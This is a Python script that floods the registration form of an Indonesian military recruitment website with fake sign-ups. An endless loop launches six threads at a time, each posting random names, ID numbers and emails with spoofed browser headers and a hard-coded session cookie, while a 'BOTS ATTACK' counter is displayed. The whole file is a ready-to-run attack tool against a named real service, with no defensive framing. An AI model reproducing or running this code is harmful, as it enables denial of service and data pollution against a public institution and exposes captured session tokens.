import os
import string
import random
import requests
import threading
class Random:
    def Words(self, length=10) :
        asciiDigits = string.ascii_letters
        generateResult = "".join( [random.choice(asciiDigits) for i in range(length)] )
        return generateResult
class banjir(Random):
    def __init__(self) :
        self.massages=0
        self.headers={
            "Host":"rekrutmen-tni.mil.id",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
            "Accept":"application/json, text/javascript, */*; q=0.01",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Content-Length":"84",
            "Origin":"https://rekrutmen-tni.mil.id",
            "Connection":"keep-alive",
            "Referer":"https://rekrutmen-tni.mil.id/registrasi/pa-pk?e=test&n=test&p=test",
            "Cookie":"_ga=GA1.3.276016916.1632286230; _gid=GA1.3.1630669050.1632286230; TRACKID=8bb7021c62c6cb0c84c83d9dbc24beea; _hjid=272c3327-2bd6-43c2-ae93-4030c8023fb0; laravel_session=eyJpdiI6ImRCNklPKzFCUEpzeXhyZDUydUNOSmc9PSIsInZhbHVlIjoiUHNZNStzNWV4NU0rUGNWYVdcL0hMTERkMFpibnFtVjFXZlpZUmtKUU1JYTFGSG5iem9NMXUxU3lqbHhCRXJcL3hwUUljY29nWTljeG1KNnZISTh2d2d6UT09IiwibWFjIjoiMDNkZGVhZTZmMWJmMTdjM2E4NmY2NTVkYjliMjkyYTk4OTZhMGMzOGQ4NWE4OWFjODgwNWY5YTUwNzNhZjdjOCJ9",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin"
        }
        self.cookies={
            "_ga":"GA1.3.276016916.1632286230",
            "_gid":"GA1.3.1630669050.1632286230",
            "_hjid":"272c3327-2bd6-43c2-ae93-4030c8023fb0",
            "laravel_session":"eyJpdiI6ImRCNklPKzFCUEpzeXhyZDUydUNOSmc9PSIsInZhbHVlIjoiUHNZNStzNWV4NU0rUGNWYVdcL0hMTERkMFpibnFtVjFXZlpZUmtKUU1JYTFGSG5iem9NMXUxU3lqbHhCRXJcL3hwUUljY29nWTljeG1KNnZISTh2d2d6UT09IiwibWFjIjoiMDNkZGVhZTZmMWJmMTdjM2E4NmY2NTVkYjliMjkyYTk4OTZhMGMzOGQ4NWE4OWFjODgwNWY5YTUwNzNhZjdjOCJ9",
            "TRACKID":"8bb7021c62c6cb0c84c83d9dbc24beea"
        }
        super().__init__()
    def papk(self, payload):
        if type(payload).__name__ != 'dict' :
            print("payload must dict")
        else :
            massages=0
            def executePayloadOnEndpoint(randomString):
                payloads = {
                    "nama_lengkap":randomString,
                    "tempat_lahir":randomString,
                    "tanggal_lahir":"28/08/2001",
                    "nik":randomString,
                    "jenis_kelamin":"Pria",
                    "email":f"{randomString}@gmail.com"
                }
                if requests.post(url=payload["endpoint"],headers=self.headers,cookies=self.cookies,data=payloads).status_code == 200 :
                    pass
                else :
                    print(False)
            while True :
                threading.Thread(target=executePayloadOnEndpoint,args=[self.Words(length=17)]).start()
                threading.Thread(target=executePayloadOnEndpoint,args=[self.Words(length=17)]).start()
                threading.Thread(target=executePayloadOnEndpoint,args=[self.Words(length=17)]).start()
                threading.Thread(target=executePayloadOnEndpoint,args=[self.Words(length=17)]).start()
                threading.Thread(target=executePayloadOnEndpoint,args=[self.Words(length=17)]).start()
                threading.Thread(target=executePayloadOnEndpoint,args=[self.Words(length=17)]).start()
                massages+=1
                os.system("cls")
                print(
                    f"TARGET      : {payload['endpoint']}\n"+
                    f"BOTS ATTACK : {massages}"
                )
Banjir = banjir()
if __name__ == "__main__" :
    Banjir.papk(
        payload = {
            "endpoint" : "http://rekrutmen-tni.mil.id/registrasi/pa-pk"
        }
    )
